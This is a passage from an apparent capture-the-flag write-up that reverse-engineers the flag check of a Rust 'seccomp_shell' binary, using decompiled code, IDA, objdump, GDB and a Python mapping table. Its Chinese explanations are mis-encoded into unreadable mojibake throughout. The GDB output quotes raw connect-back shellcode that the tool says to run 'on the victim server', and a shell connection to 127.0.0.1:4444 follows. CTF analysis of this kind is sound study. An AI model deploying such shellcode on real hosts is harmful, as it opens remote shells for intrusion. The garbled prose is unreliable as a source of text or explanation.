ç·¨è­¯å™¨å¼•å…¥çš„ä¸€ç¨®éŒ¯èª¤è™•ç†æ©Ÿåˆ¶ï¼Œç”¨ä¾†é˜²æ­¢ç´¢å¼•è¨ªå•è¶Šç•Œã€‚<br>æ•´ç†éå¾Œï¼Œçµæ§‹å¤§è‡´å¦‚ä¸‹ï¼š<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">  loop_count = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    ++loop_count;</span><br><span class="line">    <span class="comment">// æ‰“äº‚ flagï¼Œä¸¦é‡è¤‡å…«æ¬¡</span></span><br><span class="line">    <span class="built_in">memcpy</span>(dest, <span class="string">&quot;/&quot;</span>, <span class="number">0x200</span>uLL);</span><br><span class="line">    flag_index_from_tail = <span class="number">64LL</span>;</span><br><span class="line">    dest_index = (__int64 *)dest + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      dest_value1 = *(dest_index - <span class="number">1</span>);</span><br><span class="line">      <span class="comment">// swap</span></span><br><span class="line">      <span class="keyword">if</span> ( dest_value1 &gt;= <span class="number">64</span></span><br><span class="line">        || (temp1_1 = *((_BYTE *)flag_copy2 + flag_index_from_tail - <span class="number">1</span>),</span><br><span class="line">            *((_BYTE *)flag_copy2 + flag_index_from_tail - <span class="number">1</span>) = *((_BYTE *)flag_copy2 + dest_value1),</span><br><span class="line">            *((_BYTE *)flag_copy2 + dest_value1) = temp1_1,</span><br><span class="line">            dest_value2 = *dest_index,</span><br><span class="line">            (<span class="type">unsigned</span> __int64)*dest_index &gt; <span class="number">0x3F</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_53:</span><br><span class="line">        core::panicking::panic_bounds_check::<span class="built_in">h7d0e683548e4cb10</span>();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// swap</span></span><br><span class="line">      temp1_2 = *((_BYTE *)flag_copy2 + flag_index_from_tail - <span class="number">2</span>);</span><br><span class="line">      *((_BYTE *)flag_copy2 + flag_index_from_tail - <span class="number">2</span>) = *((_BYTE *)flag_copy2 + dest_value2);</span><br><span class="line">      *((_BYTE *)flag_copy2 + dest_value2) = temp1_2;</span><br><span class="line">      dest_index += <span class="number">2</span>;</span><br><span class="line">      flag_index_from_tail -= <span class="number">2LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( flag_index_from_tail );</span><br></pre></td></tr></table></figure></div></li><li>æ‰“äº‚ flag å¾Œæœƒæ¥ä¸€å€‹æŒ‰ä½åŠ å¯†çš„é‚è¼¯ï¼š<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">// æŒ‰ä½åŠ å¯†</span></span><br><span class="line">  current_index = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    currentValuePlusOne = *((<span class="type">unsigned</span> __int8 *)flag_copy2 + current_index) + <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">LOWORD</span>(intermediateValue) = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">LOWORD</span>(current_index2) = <span class="number">257</span>;</span><br><span class="line">    tempResult = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      current_index3 = current_index2;</span><br><span class="line">      <span class="built_in">LOWORD</span>(current_index2) = (<span class="type">unsigned</span> __int16)current_index2 / (<span class="type">unsigned</span> __int16)currentValuePlusOne;</span><br><span class="line">      modResult = current_index3 % (<span class="type">unsigned</span> __int16)currentValuePlusOne;</span><br><span class="line">      tempCalculation = intermediateValue;</span><br><span class="line">      intermediateValue = tempResult - (_DWORD)intermediateValue * (_DWORD)current_index2;</span><br><span class="line">      <span class="built_in">LODWORD</span>(current_index2) = currentValuePlusOne;</span><br><span class="line">      currentValuePlusOne = (<span class="type">unsigned</span> __int16)(current_index3 % (<span class="type">unsigned</span> __int16)currentValuePlusOne);</span><br><span class="line">      tempResult = tempCalculation;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( modResult );</span><br><span class="line">    finalAdjustment = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (__int16)tempCalculation &gt; <span class="number">0</span> )</span><br><span class="line">      finalAdjustment = tempCalculation;</span><br><span class="line">    finalResult = (<span class="type">unsigned</span> __int16)(finalAdjustment + ((__int16)tempCalculation &gt;&gt; <span class="number">15</span>) - tempCalculation) / <span class="number">0x101</span>u</span><br><span class="line">                + tempCalculation</span><br><span class="line">                + ((<span class="type">unsigned</span> __int16)tempCalculation &gt;&gt; <span class="number">15</span>);</span><br><span class="line">    <span class="built_in">LOBYTE</span>(finalResult) = ((<span class="type">unsigned</span> __int16)(finalAdjustment + ((__int16)tempCalculation &gt;&gt; <span class="number">15</span>) - tempCalculation)</span><br><span class="line">                         / <span class="number">0x101</span>u</span><br><span class="line">                         + tempCalculation</span><br><span class="line">                         + ((<span class="type">unsigned</span> __int16)tempCalculation &gt;&gt; <span class="number">15</span>)</span><br><span class="line">                         + <span class="number">113</span>) ^ <span class="number">0x89</span>;</span><br><span class="line">    *((_BYTE *)flag_copy2 + current_index) = finalResult;</span><br><span class="line">    current_index2 = current_index + <span class="number">1</span>;</span><br><span class="line">    current_index = current_index2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( current_index2 != <span class="number">64</span> ); <span class="comment">// flag é•·åº¦</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( loop_count != <span class="number">256</span> );</span><br></pre></td></tr></table></figure></div></li><li>å¯«äº† 255 å€‹ bytes åˆ°ä¸€å¡Šæ–°çš„ç©ºé–“é‚„æœ‰å¯« 64 å€‹ bytes åˆ° <code>dest</code>ï¼Œå¾Œé¢é‚„æœ‰ä¸€äº› TCP çš„äº¤äº’ï¼Œä½†å…·é«”é‚„çœ‹ä¸å‡ºä¾†åœ¨å¹¹å˜›ï¼š</li></ol><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åˆ†é… 255 å­—ç¯€çš„å…§å­˜</span></span><br><span class="line">allocatedMemory = (<span class="type">void</span> *)alloc::raw_vec::RawVec$LT$T$C$A$GT$::allocate_in::<span class="built_in">h9362616e9151d1f3</span>(</span><br><span class="line">                              <span class="number">255LL</span>,</span><br><span class="line">                              <span class="number">0LL</span>,</span><br><span class="line">                              finalResult,</span><br><span class="line">                              <span class="number">64LL</span>,</span><br><span class="line">                              tempCalculation,</span><br><span class="line">                              intermediateValue);</span><br><span class="line">  tempResult1 = tempResult3;</span><br><span class="line">  <span class="comment">// æŠŠæŸæ®µè³‡æ–™æ‹·è²åˆ°å‰›å‰›çš„å…§å­˜</span></span><br><span class="line">  <span class="built_in">memcpy</span>(allocatedMemory, &amp;unk_62B2B, <span class="number">0xFF</span>uLL);</span><br><span class="line">  memoryBuffer = allocatedMemory;</span><br><span class="line">  tempResult2 = tempResult1;</span><br><span class="line">  dataLength1 = <span class="number">255LL</span>;</span><br><span class="line">  alloc::vec::Vec$LT$T$C$A$GT$::resize::<span class="built_in">h7362553f00beaec8</span>(&amp;memoryBuffer, <span class="number">255LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)(commandString + <span class="number">16</span>) == <span class="number">-1</span> )</span><br><span class="line">    core::panicking::panic::<span class="built_in">h65157a6ac7f1357a</span>();</span><br><span class="line">  commandOffset = commandString + <span class="number">16</span>;</span><br><span class="line">  <span class="comment">// å¯« 64 bytes åˆ° dest</span></span><br><span class="line">  dest[<span class="number">0</span>] = xmmword_60010;</span><br><span class="line">  dest[<span class="number">1</span>] = xmmword_60020;</span><br><span class="line">  dest[<span class="number">2</span>] = xmmword_60030;</span><br><span class="line">  dest[<span class="number">3</span>] = xmmword_60040;</span><br><span class="line">  dataLength = dataLength1;</span><br><span class="line">  <span class="comment">// æ ¹æ“šä¸åŒçš„ dataLength åŸ·è¡Œä¸åŒçš„é‚è¼¯</span></span><br><span class="line">  <span class="keyword">if</span> ( dataLength1 &lt; <span class="number">0xCD</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_74;</span><br><span class="line">  memoryBuffer1 = memoryBuffer;</span><br><span class="line">  memoryBuffer[<span class="number">204</span>] = *(_BYTE *)flag_copy2;</span><br><span class="line">  <span class="keyword">if</span> ( dataLength &lt; <span class="number">0xE0</span></span><br><span class="line">    || (memoryBuffer1[<span class="number">223</span>] = <span class="number">-89</span>, memoryBuffer1[<span class="number">205</span>] = *((_BYTE *)flag_copy2 + <span class="number">1</span>), dataLength == <span class="number">224</span>)</span><br><span class="line">    || (memoryBuffer1[<span class="number">224</span>] = <span class="number">81</span>, memoryBuffer1[<span class="number">206</span>] = *((_BYTE *)flag_copy2 + <span class="number">2</span>), dataLength &lt; <span class="number">0xE2</span>)</span><br><span class="line">    || (memoryBuffer1[<span class="number">225</span>] = <span class="number">104</span>, memoryBuffer1[<span class="number">207</span>] = *((_BYTE *)flag_copy2 + <span class="number">3</span>), dataLength == <span class="number">226</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_74:</span><br><span class="line">    core::panicking::panic_bounds_check::<span class="built_in">h7d0e683548e4cb10</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  memoryBuffer1[<span class="number">226</span>] = <span class="number">82</span>;</span><br><span class="line">  <span class="comment">// é€é tcp ç™¼é€æ•¸æ“š</span></span><br><span class="line">  _$LT$$RF$std..net..tcp..TcpStream$u20$as$u20$std..io..Write$GT$::write::<span class="built_in">h0bbfc2d1fa700c7a</span>();</span><br><span class="line">  <span class="keyword">if</span> ( readBuffer[<span class="number">0</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_50:</span><br><span class="line">    <span class="comment">// è®€å–ç‹€æ…‹æœ‰éŒ¯æ™‚ï¼Œé€²è¡ŒéŒ¯èª¤è™•ç†</span></span><br><span class="line">    errorResponse = _$LT$alloc..boxed..Box$LT$dyn$u20$core..error..Error$GT$$u20$as$u20$core..convert..From$LT$E$GT$$GT$::from::<span class="built_in">ha6d5ca9d25f6de13</span>(readBuffer[<span class="number">1</span>]);</span><br><span class="line">LABEL_71:</span><br><span class="line">    errorResponse1 = errorResponse;</span><br><span class="line">    <span class="keyword">if</span> ( tempResult2 )</span><br><span class="line">      _rust_dealloc();</span><br><span class="line">    _rust_dealloc();</span><br><span class="line">    <span class="keyword">return</span> errorResponse1;</span><br><span class="line">  &#125;</span><br><span class="line">  readBuffer[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">  <span class="comment">// æ­£å¸¸æƒ…æ³ä¸‹çš„æ•¸æ“šæ“ä½œ</span></span><br><span class="line">  readResult = std::io::default_read_exact::<span class="built_in">h61fb53e2a02eb302</span>(&amp;commandOffset, readBuffer, <span class="number">8LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( readResult )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_55:</span><br><span class="line">    errorResponse = _$LT$alloc..boxed..Box$LT$dyn$u20$core..error..Error$GT$$u20$as$u20$core..convert..From$LT$E$GT$$GT$::from::<span class="built_in">ha6d5ca9d25f6de13</span>(readResult);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_71;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !readBuffer[<span class="number">0</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_70:</span><br><span class="line">    <span class="comment">// è®€å–ç‹€æ…‹æ­£å¸¸ï¼Œä½†æ˜¯æ•¸æ“šä¸ç¬¦åˆé æœŸï¼Œé€²è¡ŒéŒ¯èª¤è™•ç†</span></span><br><span class="line">    _$LT$alloc..boxed..Box$LT$dyn$u20$core..error..Error$GT$$u20$as$u20$core..convert..From$LT$$RF$str$GT$$GT$::from::<span class="built_in">hc50629fd4c285201</span>();</span><br><span class="line">    <span class="keyword">goto</span> LABEL_71;</span><br><span class="line">  &#125;</span><br><span class="line">  dataOffset = <span class="number">4LL</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    dataLength2 = dataLength1;</span><br><span class="line">    <span class="keyword">if</span> ( dataLength1 &lt; <span class="number">0xCD</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_74;</span><br><span class="line">    tempKeyPart = *(_DWORD *)((<span class="type">char</span> *)dest + dataOffset);</span><br><span class="line">    memoryBuffer2 = memoryBuffer;</span><br><span class="line">    memoryBuffer[<span class="number">204</span>] = *((_BYTE *)flag_copy2 + dataOffset);</span><br><span class="line">    <span class="keyword">if</span> ( dataLength2 &lt; <span class="number">0xE0</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_74;</span><br><span class="line">    memoryBuffer2[<span class="number">223</span>] = tempKeyPart;</span><br><span class="line">    memoryBuffer2[<span class="number">205</span>] = *((_BYTE *)flag_copy2 + dataOffset + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( dataLength2 == <span class="number">224</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_74;</span><br><span class="line">    memoryBuffer2[<span class="number">224</span>] = <span class="built_in">BYTE1</span>(tempKeyPart);</span><br><span class="line">    memoryBuffer2[<span class="number">206</span>] = *((_BYTE *)flag_copy2 + dataOffset + <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> ( dataLength2 &lt; <span class="number">0xE2</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_74;</span><br><span class="line">    memoryBuffer2[<span class="number">225</span>] = <span class="built_in">BYTE2</span>(tempKeyPart);</span><br><span class="line">    memoryBuffer2[<span class="number">207</span>] = *((_BYTE *)flag_copy2 + dataOffset + <span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span> ( dataLength2 == <span class="number">226</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_74;</span><br><span class="line">    memoryBuffer2[<span class="number">226</span>] = <span class="built_in">HIBYTE</span>(tempKeyPart);</span><br><span class="line">    _$LT$$RF$std..net..tcp..TcpStream$u20$as$u20$std..io..Write$GT$::write::<span class="built_in">h0bbfc2d1fa700c7a</span>();</span><br><span class="line">    <span class="keyword">if</span> ( readBuffer[<span class="number">0</span>] )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_50;</span><br><span class="line">    readBuffer[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">    readResult = std::io::default_read_exact::<span class="built_in">h61fb53e2a02eb302</span>(&amp;commandOffset, readBuffer, <span class="number">8LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( readResult )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_55;</span><br><span class="line">    <span class="keyword">if</span> ( !readBuffer[<span class="number">0</span>] )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_70;</span><br><span class="line">    iterationValid = (<span class="type">unsigned</span> __int64)(dataOffset + <span class="number">1</span>) &lt;= <span class="number">0x3C</span>;</span><br><span class="line">    dataOffset += <span class="number">4LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( iterationValid );</span><br><span class="line">  <span class="comment">// é‡‹æ”¾è³‡æº</span></span><br><span class="line">  <span class="keyword">if</span> ( tempResult2 )</span><br><span class="line">    _rust_dealloc();</span><br><span class="line">  _rust_dealloc();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="0x3-Exploitation"><a href="#0x3-Exploitation" class="headerlink" title="0x3 Exploitation"></a>0x3 Exploitation</h2><ol><li>é¦–å…ˆæ˜¯è¦ææ¸…æ¥šæ‰“äº‚é †åºï¼Œé€™éƒ¨åˆ†å¯ä»¥é€éç›´æ¥æ¯”è¼ƒæŒ‡å®šè¼¸å…¥å’Œå‹•æ…‹åˆ†ææ‰“äº‚çµæœä¾†å¾—çŸ¥æ˜ å°„è¡¨ï¼š</li></ol><ul><li>å…ˆç´€éŒ„ <code>verify()</code> çš„ symbolï¼š</li></ul><p>å¾ IDA çœ‹</p><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">; __int64 __fastcall seccomp_shell::shell::verify::<span class="built_in">h898bf5fa26dafbab</span>(__int64 command, __int128 *flag, __int64 len)</span><br><span class="line">.text:<span class="number">0000000000012</span>C70 _ZN13seccomp_shell5shell6verify17h898bf5fa26dafbabE proc near</span><br><span class="line">.text:<span class="number">0000000000012</span>C70                                         ; CODE XREF: seccomp_shell::shell::prompt::h76cecfe7bd3bdf50+E30â†“p</span><br></pre></td></tr></table></figure></div><p>ç”¨ objdump ä¹Ÿè¡Œï¼š</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ objdump -d ./blade | grep verify</span><br><span class="line">0000000000012c70 &lt;_ZN13seccomp_shell5shell6verify17h898bf5fa26dafbabE&gt;:</span><br><span class="line">   12c85:       0f 85 6e 05 00 00       jne    131f9 &lt;_ZN13seccomp_shell5shell6verify17h898bf5fa26dafbabE+0x589&gt;</span><br><span class="line">   12cb0:       0f 84 be 07 00 00       je     13474 &lt;_ZN13seccomp_shell5shell6verify17h898bf5fa26dafbabE+0x804&gt;</span><br><span class="line">   12d38:       0f 83 eb 04 00 00       jae    13229 &lt;_ZN13seccomp_shell5shell6verify17h898bf5fa26dafbabE+0x5b9&gt;</span><br><span class="line">   12d56:       0f 87 <span class="built_in">cd</span> 04 00 00       ja     13229 &lt;_ZN13seccomp_shell5shell6verify17h898bf5fa26dafbabE+0x5b9&gt;</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure></div><p>å¾— <code>_ZN13seccomp_shell5shell6verify17h898bf5fa26dafbabE</code>ã€‚</p><ul><li>ä¸‹æ–·é»ï¼š</li></ul><p>æ–·é»ä¸‹çš„ä½ç½®è¦é¸åœ¨å…«å€‹æ›ä½å­å¾ªç’°å¾Œï¼ŒæŒ‰ä½åŠ å¯†å‰ï¼Œä¹‹å¾Œæˆ‘å€‘æœƒå†æ¨¡æ“¬é‡è¤‡ 256 æ¬¡</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000012FFC                 movzx   edx, byte ptr [rbx+rax-2]</span><br><span class="line">.text:0000000000013001                 movzx   esi, byte ptr [rbx+rdi]</span><br><span class="line">.text:0000000000013005                 mov     [rbx+rax-2], sil</span><br><span class="line">.text:000000000001300A                 mov     [rbx+rdi], dl</span><br><span class="line">.text:000000000001300D                 add     rcx, 10h</span><br><span class="line">.text:0000000000013011                 add     rax, 0FFFFFFFFFFFFFFFEh</span><br><span class="line">.text:0000000000013015                 jnz     short loc_12FD0</span><br><span class="line">.text:0000000000013017                 xor     ecx, ecx</span><br><span class="line">.text:0000000000013019                 nop     dword ptr [rax+00000000h]</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)*v53 &gt; <span class="number">0x3F</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_53;</span><br><span class="line">  v57 = *((_BYTE *)flag_copy2 + current_index2 - <span class="number">2</span>);</span><br><span class="line">  *((_BYTE *)flag_copy2 + current_index2 - <span class="number">2</span>) = *((_BYTE *)flag_copy2 + v56);</span><br><span class="line">  *((_BYTE *)flag_copy2 + v56) = v57;</span><br><span class="line">  v53 += <span class="number">2</span>;</span><br><span class="line">  current_index2 -= <span class="number">2LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( current_index2 );</span><br><span class="line">current_index = <span class="number">0LL</span>;</span><br></pre></td></tr></table></figure></div><p>é€™é‚Šé¸ <code>xor     ecx, ecx</code>ï¼Œä¹Ÿå°±æ˜¯ <code>current_index</code> æ­¸é›¶çš„åœ°æ–¹ï¼ŒIDA å¯ä»¥çœ‹åˆ°ä½å€æ˜¯ <code>seccomp_shell::shell::verify::h898bf5fa26dafbab + 3A7</code>ï¼Œflag çš„ä½ç½®å¾å‰å¹¾è¡Œå¯ä»¥å¾—çŸ¥åœ¨ $rbxã€‚</p><ul><li>GDB çœ‹æ‰“äº‚é †åºï¼Œè¼¸å…¥ <code>1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;</code> (10 + 26 + 26 + 2 &#x3D; 64) è§€å¯Ÿï¼Œæ“·å–é‡è¦éƒ¨ä»½å¦‚ä¸‹ï¼š</li></ul><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ gdb -q ./blade</span><br><span class="line">gefâ¤  starti</span><br><span class="line">gefâ¤  <span class="built_in">break</span> *_ZN13seccomp_shell5shell6verify17h898bf5fa26dafbabE + 0x3A7</span><br><span class="line">Breakpoint 1 at 0x555555567017</span><br><span class="line">gefâ¤  c</span><br><span class="line">Continuing.</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library <span class="string">&quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;</span>.</span><br><span class="line">&gt; server</span><br><span class="line">[!] SYS_socket and SYS_connect should be allowed</span><br><span class="line">server&gt; run</span><br><span class="line">[*] Run the following shellcode on the victim server:</span><br><span class="line"><span class="string">&quot;\xeb\x10\x31\xc0\x53\x5f\x49\x8d\x77\x10\x48\x31\xd2\x80\xc2\xff\x0f\x05\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x50\x5b\x48\x97\x68\x7f\x00\x00\x01\x66\x68\x11\x5c\x66\x6a\x02\x54\x5e\xb2\x10\xb0\x2a\x0f\x05\x4c\x8d\x3d\xc5\xff\xff\xff\x41\xff\xe7&quot;</span></span><br><span class="line">[*] Waiting <span class="keyword">for</span> connection on 127.0.0.1:4444</span><br><span class="line"><span class="comment"># ./shellcode</span></span><br><span class="line">[+] Connection established from 127.0.0.1:33568</span><br><span class="line">$ flag 1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x0000555555567017 <span class="keyword">in</span> seccomp_shell::shell::verify::h898bf5fa26dafbab ()</span><br><span class="line">gefâ¤  x/s <span class="variable">$rbx</span></span><br><span class="line">0x5555555d63e0: <span class="string">&quot;HfVl&#123;qPcCYNMoRi7D8Jr&#125;espOL4FhwdWAtTGZba5Ugjvnx2QkKE3IS0yuz6BX19m&quot;</span></span><br></pre></td></tr></table></figure></div><ul><li>ç”¨ python å­—å…¸å»ºç«‹æ˜ å°„è¡¨å’Œåæ˜ å°„è¡¨ï¼š<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">original = <span class="string">&#x27;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;&#x27;</span></span><br><span class="line">shuffled = <span class="string">&#x27;HfVl&#123;qPcCYNMoRi7D8Jr&#125;espOL4FhwdWAtTGZba5Ugjvnx2QkKE3IS0yuz6BX19m&#x27;</span></span><br><span class="line"></span><br><span class="line">char_to_shuffled_map = &#123;c: shuffled[i] <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(original)&#125;</span><br><span class="line">suffled_to_char_map = &#123;shuffled[i]: c <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(original)</span><br></pre></td></tr></table></figure></div></li></ul><ol start="2"><li>å†ä¾†è¦å»ºç«‹æŒ‰ä½åŠ å¯†çš„æ˜ å°„è¡¨ï¼š</li></ol><ul><li>ä¸‹æ–·é»ï¼š</li></ul><p>æ–·é»é€™æ¬¡æœƒä¸‹åœ¨æŒ‰ä½åŠ 